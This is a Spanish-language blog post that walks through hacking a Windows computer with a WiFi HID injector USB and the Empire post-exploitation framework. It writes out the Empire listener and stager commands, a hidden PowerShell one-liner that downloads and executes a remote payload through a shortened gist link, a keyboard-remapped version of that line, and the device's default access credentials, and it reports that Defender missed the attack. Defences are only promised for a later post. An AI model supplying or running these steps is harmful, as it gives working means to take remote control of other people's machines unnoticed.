---
title: "Hacking con WiFi HID Injector y Empire"
author: Adan Alvarez
classes: wide
excerpt: "En esta entrada vamos a explicar como usar de forma simple un USB WiFi HID Injector para obtener acceso a un equipo. Para esto nos ayudaremos del framework de post-explotacion Empire."
categories:
  - Herramientas
tags:
  - C2
  - Pentest
  - Red Team
---
En esta entrada vamos a explicar como usar de forma simple un USB WiFi HID Injector para obtener acceso a un equipo. Para esto nos ayudaremos del framework de post-explotacion [Empire](https://github.com/EmpireProject/Empire).
{: style="text-align: justify;"}

En primer lugar, ¿qué es un USB WiFi HID Injector? y ¿Dónde lo conseguimos?
{: style="text-align: justify;"}

Un USB WiFi HID Injector es un USB que consta principalmente de un [Atmega32u4](https://www.microchip.com/wwwproducts/en/ATmega32U4) y un módulo [ESP-12-F](https://www.vispo.org/2015/07/19/introduccion-al-modulo-soc-wifi-esp8266-esp-12/) para añadir capacidad Wifi. Este USB al conectarse a un equipo es reconocido como un teclado y un raton. Por lo tanto, permite a un atacante conectarse vía WiFi a este y pulsar teclas o mover el ratón.
{: style="text-align: justify;"}

Este proyecto fue presentado en el [Black Hat arsenal 2017](https://www.blackhat.com/us-17/arsenal-overview.html) y está documentado en el [GitHub](https://github.com/whid-injector/WHID) del diseñador, donde podemos encontrar dónde adquirirlo.
{: style="text-align: justify;"}

En nuestro caso lo compramos en [Aliexpress](https://es.aliexpress.com/item/Cactus-Micro-compatible-board-plus-WIFI-chip-esp8266-for-atmega32u4/32318391529.html).
{: style="text-align: justify;"}

[![USB Wifi HID injector](https://donttouchmy.net/wp-content/uploads/2018/02/IMG_20180113_191809-300x225.jpg)](https://donttouchmy.net/wp-content/uploads/2018/02/IMG_20180113_191809.jpg) [![USB Wifi HID injector](https://donttouchmy.net/wp-content/uploads/2018/02/IMG_20180114_141443-300x225.jpg)](https://donttouchmy.net/wp-content/uploads/2018/02/IMG_20180114_141443.jpg)

Tal y como se indica en el GitHub estos USB ya llevan precargado ESPloitV2 por lo que podemos conectarlo y comenzar a jugar.
{: style="text-align: justify;"}

Configuración de Empire
-----------------------

Antes de poder seguir necesitaremos crear nuestro payload con Empire. En el siguiente [enlace](http://www.powershellempire.com/?page_id=110) encontraréis una pequeña guía rápida de Empire.
{: style="text-align: justify;"}

Primero de todo creamos nuestro listener:
{: style="text-align: justify;"}
´´´
uselistener http
´´´
[![Empire](https://donttouchmy.net/wp-content/uploads/2018/02/Empire1-300x150.png)](https://donttouchmy.net/wp-content/uploads/2018/02/Empire1.png)

Configuramos el puerto y la IP  en la que escuchará Empire:
{: style="text-align: justify;"}
´´´
set Host http://198.51.100.2:8081
set Port 8081
´´´
[![Empire](https://donttouchmy.net/wp-content/uploads/2018/02/Empire2-300x166.png)](https://donttouchmy.net/wp-content/uploads/2018/02/Empire2.png)

Después de esto generamos nuestro payload:
{: style="text-align: justify;"}
´´´
back
usestager windows/ducky
set Listener http
execute
´´´
[![Empire](https://donttouchmy.net/wp-content/uploads/2018/02/Empire4-300x143.png)](https://donttouchmy.net/wp-content/uploads/2018/02/Empire4.png)

Del payload obtenido la última línea será la que utilizaremos en nuestro ataque.
{: style="text-align: justify;"}

Preparando el payload
---------------------

Podríamos injectar el payload obtenido directamente a través del USB, pero tras varias pruebas realizadas el funcionamiento no es el correcto cuando la cadena de texto es tan larga.
{: style="text-align: justify;"}

Por lo tanto, utilizaremos gist.github.com para guardar allí nuestro payload  y en el ordenador de la víctima llamaremos a Powershell para que lo descargue mediante un acortador de Google
{: style="text-align: justify;"}
´´´
powershell -w 1 -nop -noni -c «IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')»
´´´
Por lo tanto, primero generamos nuestro gist.github.com con el payload:
{: style="text-align: justify;"}

[![Gist](https://donttouchmy.net/wp-content/uploads/2018/02/gist-300x83.png)](https://donttouchmy.net/wp-content/uploads/2018/02/gist.png)

y generamos un link [acortado de google](https://goo.gl/) a nuestro gist en modo raw:

[![google](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_10-35-27-300x117.png)](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_10-35-27.png)

Con esto podríamos ejecutar la línea mencionada anteriormente en una consola powershell y tendríamos acceso al ordenador de la víctima. El problema que nos encontraremos al escribir la línea mediante el USB es el teclado español. El USB está configurado para pulsar las teclas como si el teclado destino fuera inglés. Por lo tanto, si realizamos un ataque a un equipo con teclado español deberemos cambiar los caracteres especiales. Para nuestra línea los cambios serían los siguientes:
{: style="text-align: justify;"}

Substituimos - por /
Substituimos " por @
Substituimos ( por  *
Substituimos ' por -
Substituimos : por >
Substituimos / por &
Substituimos ) por (

Quedando por lo tanto la siguiente línea:
{: style="text-align: justify;"}
´´´
powershell /w 1 /nop /noni /c @IEX *New-Object Net.Webclient(.downloadstring*-https>&&goo.gl&XXXX-(@
´´´
Donde XXXX es el link acortado de Google.

Con esto ya podemos ejecutar nuestro ataque.

Cargar el payload con el USB Wifi HID injector
----------------------------------------------

Al conectar el USB a un ordenador, este creará un punto de acceso con SSID «Exploit» al que nos podremos conectar con la contraseña: DotAgency
{: style="text-align: justify;"}

Una vez conectados, en este caso con un móvil, accedemos con un navegador a http://192.168.1.1 y con los datos:

User: admin

Password: hacktheplanet

[![ESPloit](https://donttouchmy.net/wp-content/uploads/2018/02/Screenshot_20180217-103631-169x300.png)](https://donttouchmy.net/wp-content/uploads/2018/02/Screenshot_20180217-103631.png)

En este menú principal hacemos clic en Input Mode y nos llevará a una pantalla donde podremos gestionar el ratón y el teclado.
{: style="text-align: justify;"}

[![ESPloit](https://donttouchmy.net/wp-content/uploads/2018/02/Screenshot_20180217-103716-169x300.png)](https://donttouchmy.net/wp-content/uploads/2018/02/Screenshot_20180217-103716.png)

En esta lanzaremos nuestro ataque de forma sencilla.
{: style="text-align: justify;"}

Pulsamos sobre el botón GUI+r

escribiremos:
´´´
PrintLine: powershell
´´´
y haremos clic en Send Text+Enter

Después de esto escribiremos:
´´´
PrintLine: powershell /w 1 /nop /noni /c @IEX *New-Object Net.Webclient(.downloadstring*-https>&&goo.gl&XXXX-(@
´´´
[![](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_18-34-49-300x131.png)](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_18-34-49.png)

y haremos clic de nuevo en Send Text+Enter

Tras esto podemos volver a nuestra máquina con Empire y verificar que tenemos un nuevo agente !

[![Empire](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_16-47-33-300x54.png)](https://donttouchmy.net/wp-content/uploads/2018/02/2018-02-17_16-47-33.png)

En nuestro caso realizamos el ataque en una máquina Windows 10 actualizada y con defender activo.  Defender no detectó el ataque en ningún momento.

En próximos post detallaremos más funcionalidades del USB y métodos de defensa.